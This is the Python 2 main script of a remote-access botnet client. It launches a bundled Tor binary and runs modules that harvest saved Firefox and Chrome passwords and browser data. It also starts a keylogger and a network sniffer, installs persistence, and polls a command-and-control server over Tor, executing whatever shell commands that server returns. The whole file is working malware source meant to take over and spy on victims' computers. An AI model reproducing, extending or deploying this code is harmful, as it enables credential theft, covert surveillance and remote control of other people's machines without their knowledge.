import time
import os
import requests
import sys
import platform
import socket
import random
import string
import settings
import utils
import ipgetter

from modules import runcmd
from modules import persistence
from modules import chrome
from modules import chromedata
from modules import firefox
from modules import keylogger
from modules import getsniffer
from modules import remove
from modules import infopc
from threading import Thread


MODULES = ['runcmd', 'persistence','chrome','firefox','keylogger','infopc']
REMOVE_FLAG = False

if not settings.BOT_ID:
    settings.BOT_ID = socket.gethostname()
if not utils.validate_botid(settings.BOT_ID):
    settings.BOT_ID = ''.join(random.choice(string.ascii_letters) for _ in range(5))

def snifferget():
	getsniffer.run()	

def print_help(mod=None):
    help_text = "Loaded modules:\n"
    if mod is None:
        for module in MODULES: 
            help_text += "- " + module + "\n"
            help_text += sys.modules["modules." + module].help()
        help_text += """
General commands:

- cd path/to/dir : changes directory
- help : display this text
- [any other command] : execute shell command

"""
    else:
        help_text = "- " + mod + "\n"
        help_text += sys.modules["modules.%s" % mod].help()

    utils.send_output(help_text)

def create_connection(address, timeout=None, source_address=None):   
	sock = socks.socksocket()  
	sock.connect(address)   
	return sock


def sttor(path_to_execute):
	os.system(path_to_execute)	

	
if __name__ == "__main__":
    ip = ipgetter.myip()
    path_to_execute = os.path.dirname(sys.argv[0]) + "\\RT64DMB\\Browser\\TorBrowser\\Tor\\tor.exe --defaults-torrc \\torrc.default"

    thread = Thread(target = sttor, args = (path_to_execute, ))
    thread.start()

    time.sleep(settings.PAUSE_AT_START)
    
    if settings.AUTO_PASSWORD_SENDER:
        firefox.run()
        time.sleep(2)
        chrome.run()
        time.sleep(2)
        chromedata.run()
    if settings.AUTO_KEYLOGGER:
		keylogger.run("start")
    if settings.AUTO_GET_SNIFFER:
		thread1 = Thread(target = snifferget)
		thread1.start()
    if settings.AUTO_PERSIST:
        persistence.install()
    last_active = time.time()
    is_idle = False
    infopc.run()
    while 1:
        if is_idle:
            time.sleep(settings.REQUEST_INTERVAL * 10)
        else:
            time.sleep(settings.REQUEST_INTERVAL)
        try:
            import socks, socket, urllib2 , urllib
            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, settings.PROXY_TOR_IP, settings.PROXY_TOR_PORT)
            socket.socket = socks.socksocket
            socket.create_connection = create_connection

            if REMOVE_FLAG == True:
				pass
            else:
             payload = settings.SERVER_URL + "/api/pop?botid=" + settings.BOT_ID + "&sysinfo=" + platform.system() + platform.release() + "&ip=" + ip
             payload = payload.replace(" ","_")
             command = urllib2.urlopen(payload).read()
             cmdargs = command.split(" ")
			 
             if command:
                if settings.DEBUG:
                    print command
                if cmdargs[0] == "cd":
                    os.chdir(os.path.expandvars(" ".join(cmdargs[1:])))
                if cmdargs[0] == "removeme":
					REMOVE_FLAG = True
					remove.run()
					persistence.clean()
                elif cmdargs[0] in MODULES:
                    sys.modules["modules.%s" % cmdargs[0]].run(*cmdargs[1:])
                elif cmdargs[0] == "help":
                    if len(cmdargs) > 1:
                        print_help(cmdargs[1])
                    else:
                        print_help()
                else:
                    runcmd.run(command)
                last_active = time.time()
                is_idle = False
             elif time.time() - last_active > settings.IDLE_TIME:
                is_idle = True
        except Exception, exc:
            if "0x01" in exc:
				print "[-] Exception in Tor Sockets : 0x01"
            is_idle = True
            if settings.DEBUG:
                print exc
